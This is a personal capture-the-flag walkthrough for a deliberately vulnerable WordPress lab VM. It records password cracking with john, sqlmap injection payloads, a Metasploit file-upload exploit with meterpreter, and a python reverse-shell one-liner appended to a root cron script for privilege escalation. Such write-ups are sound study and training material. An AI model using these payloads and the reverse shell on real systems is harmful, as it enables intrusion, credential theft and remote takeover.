# Used information/Commands

In this file, there are more concrete attempts, that helped me to reach the flags. In the last section `Flags`, there is a detailed explanation on how each flag was obtained.

VM IP - {TARGET_MACHINE_IP}

WPScan API token - {API_TOKEN}

## Attempts

### Get users from WP API

http://{TARGET_MACHINE_IP}/music/wordpress/index.php/wp-json/wp/v2/users

### Inside FTP

#### Inside howard folder

To unencrypt the zip, we can use joh to crack the password

Use zip2john to put the zip into an hash

   zip2john super_secret_nasa_stuff_here.zip > zip-hash.txt

Then execute:
   john --wordlist=/usr/share/wordlists/rockyou.txt zip-hash.txt

```
   Using default input encoding: UTF-8
   Loaded 1 password hash (PKZIP [32/64])
   Will run 4 OpenMP threads
   Press 'q' or Ctrl-C to abort, almost any other key for status
   astronaut        (super_secret_nasa_stuff_here.zip/marsroversketch.jpg)     
   1g 0:00:00:00 DONE (2025-11-08 06:39) 100.0g/s 7372Kp/s 7372Kc/s 7372KC/s ryanscott..compusa
   Use the "--show" option to display all of the cracked passwords reliably
   Session completed.
```

Inside of it, there is an image, that we are going to try and check if it has anything hidden. To hide something inside an image you always need a password, so we are going to install stegcracker to also brute-force the password

Using:

   stegcracker marsroversketch.jpg
```
   StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
   Copyright (c) 2025 - Luke Paris (Paradoxis)

   StegCracker has been retired following the release of StegSeek, which 
   will blast through the rockyou.txt wordlist within 1.9 second as opposed 
   to StegCracker which takes ~5 hours.

   StegSeek can be found at: https://github.com/RickdeJager/stegseek

   No wordlist was specified, using default rockyou.txt wordlist.
   Counting lines in wordlist..
   Attacking file 'marsroversketch.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
   Successfully cracked file with password: iloveyoumom
   Tried 51221 passwords
   Your file has been written to: marsroversketch.jpg.out
   iloveyoumom
```

#### Go into /tmp

Find wordpress_dump.sql
```
--
-- Dumping data for table `wp_users`
--

LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES (1,'footprintsonthemoon','$P$BFLeWWEe.4pVHfJB6s6P6.0c6nYctc/','footprintsonthemoon','footprintsonthemoon@localhost.com','','2020-03-04 13:20:41','1761514263:$P$BO3u8ceTzGjLzuEGATWx5T7YBGdVNV/',0,'footprintsonthemoon'),(2,'kripke','$P$BDKbtgEvH7gYy.WN/yHpgXCuxDPxRz/','kripke','kripke@kripke.com','','2020-03-04 13:44:57','1583329498:$P$B/6Ncexoc9g3tJOggQJvo2/npr5WHw0',0,'kripke'),(3,'stuart','$P$BpHBwNm3fHTK28WUvZThgDmIJkmZrY/','stuart','stuart@stuart.com','','2020-03-04 13:48:30','1583329711:$P$BJbz3KB.OSQUCk/cZjlGFNrXAxJe7B1',0,'stuart'),(4,'teste','$P$B60VKq8igczbT4L/p1WuYZwk3IetNI/','teste','teste@gmail.com','','2025-03-25 00:49:46','1742863786:$P$BwPOLCISXifpUCePjWx7kuUzjGBCAq.',0,'teste'),(5,'ritinha','$P$BSP5spH0mcNzmuNamVixddu4my42FE/','ritinha','ritinha@gmail.om','','2025-04-15 18:13:37','1744740817:$P$BH70tGStO9psNGRnrLYtCqzph1/xDh1',0,'ritinha');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-11-04  0:47:44
```

#### Knowing the files are at /var/www/html/

Go inside private/db_config.php

cat db_config.php
   <?php
   // Create connection
   $DBUSER = 'bigpharmacorp';
   $DBPASS = 'weareevil';

   $con=mysqli_connect("127.0.0.1",$DBUSER,$DBPASS,"bigpharmacorp");

   // Check connection
   if (mysqli_connect_errno($con))
   {
   echo "<font style=\"color:#FF0000\">Could not connect:". mysqli_connect_error()."</font\>";
   }
?>

Use credentials in reverse shell and do to have an output, for example:

   mysql -h 127.0.0.1 -u bigpharmacorp -p'weareevil' -e 'SHOW TABLES FROM bigpharmacorp;'
   mysql: [Warning] Using a password on the command line interface can be insecure.
   Tables_in_bigpharmacorp
   products
   users

Get all users information

   mysql -h 127.0.0.1 -u bigpharmacorp -p'weareevil' -e 'SELECT * FROM bigpharmacorp.users';
   mysql: [Warning] Using a password on the command line interface can be insecure.
   id      username        password        fname   description
   1       admin   3fc0a7acf087f549ac2b266baf94b8b1        josh    Dont mess with me
   2       bobby   8cb1fb4a98b9c43b7ef208d624718778        bob     I like playing football.
   3       penny69 cafa13076bb64e7f8bd480060f6b2332        penny   Hi I am Penny I am new here!! <3
   4       mitsos1981      05d51709b81b7e0f1a9b6b4b8273b217        dimitris        Opa re malaka!
   5       alicelove       e146ec4ce165061919f887b70f49bf4b        alice   Eat Pray Love
   6       bernadette      dc5ab2b32d9d78045215922409541ed7        bernadette      FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}

#### PHP Details

/wp-includes/version.php

```
   <?php
   /**
   * WordPress Version
   *
   * Contains version information for the current WordPress release.
   *
   * @package WordPress
   * @since 1.1.0
   */

   /**
   * The WordPress version string
   *
   * @global string $wp_version
   */
   $wp_version = '5.3.2';

   /**
   * Holds the WordPress DB revision, increments when changes are made to the WordPress DB schema.
   *
   * @global int $wp_db_version
   */
   $wp_db_version = 45805;

   /**
   * Holds the TinyMCE version
   *
   * @global string $tinymce_version
   */
   $tinymce_version = '4960-20190918';

   /**
   * Holds the required PHP version
   *
   * @global string $required_php_version
   */
   $required_php_version = '5.6.20';

   /**
   * Holds the required MySQL version
   *
   * @global string $required_mysql_version
   */
   $required_mysql_version = '5.0';
```

WordPress 5.3.2 uses the PHPass framework for password hashing.

##### John password crack (/music/wordpress/...)

I all usernames:user_pass into a file:

   footprintsonthemoon:$P$BFLeWWEe.4pVHfJB6s6P6.0c6nYctc/
   kripke:$P$BDKbtgEvH7gYy.WN/yHpgXCuxDPxRz/
   stuart:$P$BpHBwNm3fHTK28WUvZThgDmIJkmZrY/
   teste:$P$B60VKq8igczbT4L/p1WuYZwk3IetNI/
   ritinha:$P$BSP5spH0mcNzmuNamVixddu4my42FE/

And executed the following command:

   john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt phpass-hashes.txt

   Using default input encoding: UTF-8
   Loaded 8 password hashes with 8 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
   Cost 1 (iteration count) is 8192 for all loaded hashes
   Will run 4 OpenMP threads
   Press 'q' or Ctrl-C to abort, almost any other key for status
   dragon           (stuart)     
   password1234     (kripke)
   Use the "--show --format=phpass" options to display all of the cracked passwords reliably
   Session completed. 


#### Inside /leonard

Do a ls -al and it has root permissions 'thermostat_set_temp.sh'

Then I check if VM has python, python --version

Create a reverse shell with python (go to revshells.com and choose one with python since the system has python)

On my machine:

   nc -lvnp 9002

Then, on the target machine, add a reverse shell to the following script with root permissions (thermostat_set_temp.sh)
The following command adds a line to the script, since we can't edit it using nano, for example
Since we have the information the script executed every minute from what Leonard had in one of his files, it will be automatically executed

   echo "export RHOST="{LOCAL_MACHINE_IP}";export RPORT=9002;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'" >> thermostat_set_temp.sh

Then we can check the shell on our side and get the flag

FLAG-leonard{17fc95224b65286941c54747704acd3e}


### Through the website (/private/...)

Go into http://{TARGET_MACHINE_IP}/private/login.php and use DB credentials
   Does not work

After looking more, I can see that login.php has the following code
```
if (!empty($_REQUEST['uid'])) {
   $username = ($_REQUEST['uid']);
   $pass = $_REQUEST['password'];

   $q = "SELECT * FROM users where username='".$username."' AND password = '".md5($pass)."'" ;
   ...
}
```
After analyzing the request, we use sqlmap to use a valid payload:
```
   $ sqlmap --wizard
         ___
         __H__
   ___ ___[.]_____ ___ ___  {1.9.9#stable}
   |_ -| . [(]     | .'| . |
   |___|_  [']_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 17:45:25 /2025-11-04/

   [17:45:25] [INFO] starting wizard interface
   Please enter full target URL (-u): http://{TARGET_MACHINE_IP}/private/login.php
   POST data (--data) [Enter for None]: 

   [17:45:39] [WARNING] no GET and/or POST parameter(s) found for testing (e.g. GET parameter 'id' in 'http://www.site.com/vuln.php?id=1'). Will search for forms
   Injection difficulty (--level/--risk). Please choose:
   [1] Normal (default)
   [2] Medium
   [3] Hard
   > 1
   Enumeration (--banner/--current-user/etc). Please choose:
   [1] Basic (default)
   [2] Intermediate
   [3] All
   > 1

   sqlmap is running, please wait..

   [1/1] Form:
   POST http://{TARGET_MACHINE_IP}/private/login.php
   POST data: uid=&password=
   do you want to test this form? [Y/n/q] 
   > Y
   Edit POST data [default: uid=&password=] (Warning: blank fields detected): uid=&password=
   do you want to fill blank fields with random values? [Y/n] Y
   it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y      
   for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y                                                                                                             
   got a 302 redirect to 'http://{TARGET_MACHINE_IP}/private/searchproducts.php'. Do you want to follow? [Y/n] Y                   
   redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
   POST parameter 'uid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
   sqlmap identified the following injection point(s) with a total of 132 HTTP(s) requests:                                       
   ---                                                                                                                            
   Parameter: uid (POST)                                                                                                          
      Type: boolean-based blind                                                                                                  
      Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)                                               
      Payload: uid=xIcZ' OR NOT 3507=3507#&password=qMzc

      Type: error-based
      Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
      Payload: uid=xIcZ' AND GTID_SUBSET(CONCAT(0x71787a6271,(SELECT (ELT(9645=9645,1))),0x7176787871),9645)-- JpuP&password=qMzc

      Type: time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
      Payload: uid=xIcZ' AND (SELECT 9166 FROM (SELECT(SLEEP(5)))YQCR)-- iqWc&password=qMzc

      Type: UNION query
      Title: MySQL UNION query (NULL) - 5 columns
      Payload: uid=xIcZ' UNION ALL SELECT NULL,CONCAT(0x71787a6271,0x79724a736a4c6442464c6f6c555a597964496576666376444774596372696a7a417a4f6371786b64,0x7176787871),NULL,NULL,NULL#&password=qMzc
```

So, we put the following on username "xIcZ' UNION ALL SELECT NULL,CONCAT(0x71787a6271,0x79724a736a4c6442464c6f6c555a597964496576666376444774596372696a7a417a4f6371786b64,0x7176787871),NULL,NULL,NULL#" and on password does not matter "a"

This takes us to searchproducts.php page, where we can see the code with the reverse shell and see that 
```
   <?php
   if (isset($_POST["searchitem"])) {

   $q = "Select * from products where product_name like '".$_POST["searchitem"]."%'";

   if (isset($_GET['debug']))
   {
         if ($_GET['debug']=="true")
   {
         echo "<pre>".$q."</pre><br /><br />";
         }
   }

   $result = mysqli_query($con,$q);
```

Use http://{TARGET_MACHINE_IP}/private/searchproducts.php?debug=true to see the query used

1' UNION ALL SELECT * FROM users #

With this, we see all password hashes from users, and we know it is a weak encryption algorithm so we are going to attempt to crack it

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin-josh.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty123        (?)     
1g 0:00:00:00 DONE (2025-11-04 18:10) 100.0g/s 230400p/s 230400c/s 230400C/s laurita..abcdefgh
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably

And so, `admin` password is `qwerty123`

#### After reading the /music/wordpress/readme.html

I went using the reverse shell and read the wp-config.php, that has the base configurations for WordPress
```
   <?php
   /**
   * The base configuration for WordPress
   *
   * The wp-config.php creation script uses this file during the
   * installation. You don't have to use the web site, you can
   * copy this file to "wp-config.php" and fill in the values.
   *
   * This file contains the following configurations:
   *
   * * MySQL settings
   * * Secret keys
   * * Database table prefix
   * * ABSPATH
   *
   * @link https://codex.wordpress.org/Editing_wp-config.php
   *
   * @package WordPress
   */

   // ** MySQL settings - You can get this info from your web host ** //
   /** The name of the database for WordPress */
   define( 'DB_NAME', 'footprintsonthemoon' );

   /** MySQL database username */
   define( 'DB_USER', 'footprintsonthemoon' );

   /** MySQL database password */
   define( 'DB_PASSWORD', 'footprintsonthemoon1337' );

   /** MySQL hostname */
   define( 'DB_HOST', 'localhost' );

   /** Database Charset to use in creating database tables. */
   define( 'DB_CHARSET', 'utf8mb4' );

   /** The Database Collate type. Don't change this if in doubt. */
   define( 'DB_COLLATE', '' );

   /**#@+
   * Authentication Unique Keys and Salts.
   *
   * Change these to different unique phrases!
   * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
   * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
   *
   * @since 2.6.0
   */
   define( 'AUTH_KEY',         'ZLPTr}-Y7wb_]4C*yi=F6wKY0K3hTvKS]Co z.Mviq8!S[`jG{wK)V/=dN,#iy#C' );
   define( 'SECURE_AUTH_KEY',  '?(*EF3#S6hq^@Zfq&O,:!=RRexb)PJ<c6cyVW|b/x#6ss/)i>{CyYQE$J8Ww0AH5' );
   define( 'LOGGED_IN_KEY',    'rIe3d*Q6AExK]4<<0+kpMJiW;Qy{$f$(_>w8~a%_J?Wba7,[ZLXd/rz<2K-BW_*Q' );
   define( 'NONCE_KEY',        '4F9[))u |</@~ii@?j&&a[}O**I[a:74|_v2#*Ls(K{fb3H5gTFZ*x_r_~&E$y/4' );
   define( 'AUTH_SALT',        'BW1_YHu2:u[y|~SEvRF_/iD^rE|LKE0ty,3P=MSbg3#RN?93]D(V2)~+.ojV~~<)' );
   define( 'SECURE_AUTH_SALT', 'wwuhBku>o`1TGWP$@.[nQ_VB9t]*IwI%;Wwbt^N_2<a?Q8}VVMYQT8Ns8clpCIVY' );
   define( 'LOGGED_IN_SALT',   'Rotn? sKh@kqSR[^;y!0,vTxlqj2C`K&YB!,3bq;isL4S%d[CC>&/f}-q*!]fzjr' );
   define( 'NONCE_SALT',       'u=E1H:iN>T_jp7IB30[xi|WRC2Q3g*v(tN.`TzuLP5=iVpX}}`oY$dJod<4M8d!2' );

   /**#@-*/

   /**
   * WordPress Database Table prefix.
   *
   * You can have multiple installations in one database if you give each
   * a unique prefix. Only numbers, letters, and underscores please!
   */
   $table_prefix = 'wp_';

   /**
   * For developers: WordPress debugging mode.
   *
   * Change this to true to enable the display of notices during development.
   * It is strongly recommended that plugin and theme developers use WP_DEBUG
   * in their development environments.
   *
   * For information on other constants that can be used for debugging,
   * visit the Codex.
   *
   * @link https://codex.wordpress.org/Debugging_in_WordPress
   */
   define( 'WP_DEBUG', false );

   /* That's all, stop editing! Happy publishing. */

   /** Absolute path to the WordPress directory. */
   if ( ! defined( 'ABSPATH' ) ) {
         define( 'ABSPATH', dirname( __FILE__ ) . '/' );
   }

   /** Sets up WordPress vars and included files. */
   require_once( ABSPATH . 'wp-settings.php' );
```

With this, we can connect to the WordPress DB doing 

##### Get all data in dbs
   mysql -u footprintsonthemoon -p'footprintsonthemoon1337' -h localhost -e "SHOW DATABASES;"

   mysql: [Warning] Using a password on the command line interface can be insecure.
   Database
   information_schema
   footprintsonthemoon

##### Get all data in tables in db
   mysql -u footprintsonthemoon -p'footprintsonthemoon1337' -h localhost -D footprintsonthemoon -e "SHOW TABLES;"

   mysql: [Warning] Using a password on the command line interface can be insecure.
   Tables_in_footprintsonthemoon
   wp_commentmeta
   wp_comments
   wp_links
   wp_options
   wp_postmeta
   wp_posts
   wp_reflex_gallery
   wp_reflex_gallery_images
   wp_responsive_thumbnail_slider
   wp_term_relationships
   wp_term_taxonomy
   wp_termmeta
   wp_terms
   wp_usermeta
   wp_users

##### Get all data in wp_users
   mysql -u footprintsonthemoon -p'footprintsonthemoon1337' -D footprintsonthemoon -e "SELECT * FROM wp_users;"

   ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered user_activation_key     user_status     display_name
   1       footprintsonthemoon     $P$BFLeWWEe.4pVHfJB6s6P6.0c6nYctc/      footprintsonthemoon     footprintsonthemoon@localhost.com               2020-03-04 13:20:41     1762305354:$P$B5Dw9PGeVQKP2R8aaY/vP0fXst0L0E0   0       footprintsonthemoon
   2       kripke  $P$BDKbtgEvH7gYy.WN/yHpgXCuxDPxRz/      kripke  kripke@kripke.com               2020-03-04 13:44:57     1583329498:$P$B/6Ncexoc9g3tJOggQJvo2/npr5WHw0   0       kripke
   3       stuart  $P$BpHBwNm3fHTK28WUvZThgDmIJkmZrY/      stuart  stuart@stuart.com               2020-03-04 13:48:30     1583329711:$P$BJbz3KB.OSQUCk/cZjlGFNrXAxJe7B1   0       stuart
   4       teste   $P$B60VKq8igczbT4L/p1WuYZwk3IetNI/      teste   teste@gmail.com         2025-03-25 00:49:46     1742863786:$P$BwPOLCISXifpUCePjWx7kuUzjGBCAq.   0       teste
   5       ritinha $P$BSP5spH0mcNzmuNamVixddu4my42FE/      ritinha ritinha@gmail.om                2025-04-15 18:13:37     1744740817:$P$BH70tGStO9psNGRnrLYtCqzph1/xDh1   0       ritinha


## Commands

### Start Metasploit

sudo msfdb run

### WPScan User Enumeration

wpscan --url http://{TARGET_MACHINE_IP}/music/wordpress --api-token {API_TOKEN} --enumerate u

### WPScan XMLRPC_LOGIN bruteforce attempt

wpscan --url http://{TARGET_MACHINE_IP}/music/wordpress --api-token {API_TOKEN} --passwords /usr/share/wordlists/rockyou.txt --usernames footprintsonthemoon --max-threads 20

wpscan --url http://{TARGET_MACHINE_IP}/music/wordpress --api-token {API_TOKEN} -P /usr/share/wordlists/rockyou.txt -U footprintsonthemoon --password-attack xmlrpc --random-user-agent

- So it does not break when Ruby can't treat passowrds as UTF-8

https://github.com/wpscanteam/wpscan/issues/1489

Result example: 
[+] Performing password attack on Xmlrpc against 1 user/s
Trying footprintsonthemoon / Lets you update your FunNotes and more! Time: 00:08:46 <> (22750 / 14344392)  0.15%  ETA: Trying footprintsonthemoon / perbertido Time: 03:51:43 <==                                                                        > (602035 / 14344392)  4.19%  ETA: 88:09:38
[i] No Valid Passwords Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 25

[+] Finished: Tue Nov  4 19:26:29 2025
[+] Requests Done: 602217
[+] Cached Requests: 5
[+] Data Sent: 335.031 MB
[+] Data Received: 354.699 MB
[+] Memory used: 164.367 MB
[+] Elapsed time: 03:51:50

Scan Aborted: invalid byte sequence in UTF-8
Trace: /usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:52:in `gsub!'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:52:in `text'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:21:in `tag'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:199:in `conv2value'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:121:in `block in methodCall'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:120:in `collect'
/usr/lib/ruby/vendor_ruby/xmlrpc/create.rb:120:in `methodCall'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/app/models/xml_rpc.rb:48:in `method_call'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.28/app/finders/passwords/xml_rpc.rb:11:in `login_request'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:39:in `block (2 levels) in attack'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:38:in `each'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:38:in `block in attack'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:33:in `foreach'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/finders/finder/breadth_first_dictionary_attack.rb:33:in `attack'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.28/app/controllers/password_attack.rb:46:in `run'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/controllers.rb:50:in `each'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/controllers.rb:50:in `block in run'
/usr/lib/ruby/3.3.0/timeout.rb:170:in `timeout'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/controllers.rb:45:in `run'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/scan.rb:24:in `run'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.28/bin/wpscan:17:in `block in <top (required)>'
/usr/share/rubygems-integration/all/gems/cms_scanner-0.15.0/lib/cms_scanner/scan.rb:15:in `initialize'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.28/bin/wpscan:6:in `new'
/usr/share/rubygems-integration/all/gems/wpscan-3.8.28/bin/wpscan:6:in `<top (required)>'
/usr/bin/wpscan:25:in `load'
/usr/bin/wpscan:25:in `<main>'


## Flags

### Amy

Use measploit on 'http://{TARGET_MACHINE_IP}/music/wordpress'

'Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, soc
                                         ks5h
   RHOSTS     {TARGET_MACHINE_IP}        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /music/wordpress yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  {LOCAL_MACHINE_IP}        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Reflex Gallery 3.1.3
'

After this exploit with these settings, insert 'shell' to create a shell, go to /home/amy, do cat of secretdiary, and flag is there

### Bernardette

Knowing the files are at /var/www/html/

Go inside private/db_config.php

cat db_config.php
   <?php
   // Create connection
   $DBUSER = 'bigpharmacorp';
   $DBPASS = 'weareevil';

   $con=mysqli_connect("127.0.0.1",$DBUSER,$DBPASS,"bigpharmacorp");

   // Check connection
   if (mysqli_connect_errno($con))
   {
   echo "<font style=\"color:#FF0000\">Could not connect:". mysqli_connect_error()."</font\>";
   }
?>

Use credentials in reverse shell and do to have an output, for example:

   mysql -h 127.0.0.1 -u bigpharmacorp -p'weareevil' -e 'SHOW TABLES FROM bigpharmacorp;'
   mysql: [Warning] Using a password on the command line interface can be insecure.
   Tables_in_bigpharmacorp
   products
   users

Get all users information

   mysql -h 127.0.0.1 -u bigpharmacorp -p'weareevil' -e 'SELECT * FROM bigpharmacorp.users';
   mysql: [Warning] Using a password on the command line interface can be insecure.
   id      username        password        fname   description
   1       admin   3fc0a7acf087f549ac2b266baf94b8b1        josh    Dont mess with me
   2       bobby   8cb1fb4a98b9c43b7ef208d624718778        bob     I like playing football.
   3       penny69 cafa13076bb64e7f8bd480060f6b2332        penny   Hi I am Penny I am new here!! <3
   4       mitsos1981      05d51709b81b7e0f1a9b6b4b8273b217        dimitris        Opa re malaka!
   5       alicelove       e146ec4ce165061919f887b70f49bf4b        alice   Eat Pray Love
   6       bernadette      dc5ab2b32d9d78045215922409541ed7        bernadette      FLAG-bernadette{f42d950ab0e966198b66a5c719832d5f}

### Raj

After going inside the {TARGET_MACHINE_IP}/phpmyadmin using the DB credentials, export the DB and check for a flag

In this case, it is inside of a post

'FLAG-raz{40d17a74e28a62eac2df19e206f0987c}'

```
(39, 1, '2020-03-04 15:04:50', '2020-03-04 15:04:50', '<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=CevxZvSJLk8","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->\n<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">\nhttps://www.youtube.com/watch?v=CevxZvSJLk8\n</div></figure>\n<!-- /wp:core-embed/youtube -->\n\n<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=kffacxfA7G4","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-4-3 wp-has-aspect-ratio"} -->\n<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-4-3 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">\nhttps://www.youtube.com/watch?v=kffacxfA7G4\n</div></figure>\n<!-- /wp:core-embed/youtube -->\n\n<!-- wp:paragraph -->\n<p>FLAG-raz{40d17a74e28a62eac2df19e206f0987c}</p>\n<!-- /wp:paragraph -->', 'Secret notes', '', 'inherit', 'closed', 'closed', '', '30-revision-v1', '', '', '2020-03-04 15:04:50', '2020-03-04 15:04:50', '', 30, 'http://192.168.1.105/music/wordpress/index.php/2020/03/04/30-revision-v1/', 0, 'revision', '', 0);
```

### Sheldon

After doing a full nmap (to all ports), do a more details nmap to port 1337, we can find the flag

   sudo nmap -p1337 -sV {TARGET_MACHINE_IP}

   Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 06:19 EST
   Nmap scan report for {TARGET_MACHINE_IP}
   Host is up (0.022s latency).

   PORT     STATE SERVICE VERSION
   1337/tcp open  waste?
   1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
   SF-Port1337-TCP:V=7.95%I=7%D=11/8%Time=690F2747%P=x86_64-pc-linux-gnu%r(NU
   SF:LL,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GenericLine
   SF:s,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(GetRequest,2
   SF:F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(HTTPOptions,2F,
   SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RTSPRequest,2F,"F
   SF:LAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(RPCCheck,2F,"FLAG-s
   SF:heldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSVersionBindReqTCP,2F,
   SF:"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(DNSStatusRequestT
   SF:CP,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Help,2F,"FL
   SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SSLSessionReq,2F,"FL
   SF:AG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServerCookie
   SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(TLSSessionReq
   SF:,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(Kerberos,2F,"
   SF:FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SMBProgNeg,2F,"FLA
   SF:G-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(X11Probe,2F,"FLAG-she
   SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(FourOhFourRequest,2F,"FLAG
   SF:-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LPDString,2F,"FLAG-she
   SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPSearchReq,2F,"FLAG-she
   SF:ldon{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LDAPBindReq,2F,"FLAG-sheld
   SF:on{cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(SIPOptions,2F,"FLAG-sheldon{
   SF:cf88b37e8cb10c4005c1f2781a069cf8}\n")%r(LANDesk-RC,2F,"FLAG-sheldon{cf8
   SF:8b37e8cb10c4005c1f2781a069cf8}\n")%r(TerminalServer,2F,"FLAG-sheldon{cf
   SF:88b37e8cb10c4005c1f2781a069cf8}\n")%r(NCP,2F,"FLAG-sheldon{cf88b37e8cb1
   SF:0c4005c1f2781a069cf8}\n")%r(NotesRPC,2F,"FLAG-sheldon{cf88b37e8cb10c400
   SF:5c1f2781a069cf8}\n")%r(JavaRMI,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f27
   SF:81a069cf8}\n")%r(WMSRequest,2F,"FLAG-sheldon{cf88b37e8cb10c4005c1f2781a
